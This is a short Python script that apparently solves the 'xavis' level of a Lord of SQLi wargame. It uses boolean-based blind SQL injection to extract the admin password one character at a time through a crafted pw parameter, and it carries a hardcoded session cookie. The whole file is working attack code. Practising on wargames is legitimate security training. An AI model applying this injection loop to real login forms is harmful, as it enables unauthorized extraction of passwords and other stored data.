import requests
import string
choices=string.digits+string.ascii_letters
                  
headers={'Cookie':'PHPSESSID=v3e3u9dkq68cn48vh73q6snms6'}
flag=''
for i in range (1,40):
    for j in range(160,255):
        print(str(i)+"  ::  "+chr(j)+"  ::  "+str(j))
        page="https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=' or ord(substr(pw,"+str(i)+",1))="+str(j)+"-- -"
        if "Hello admin" in (requests.get(page,headers=headers)).text:
            print(page)
            flag+=chr(j)
            print(flag)
            break   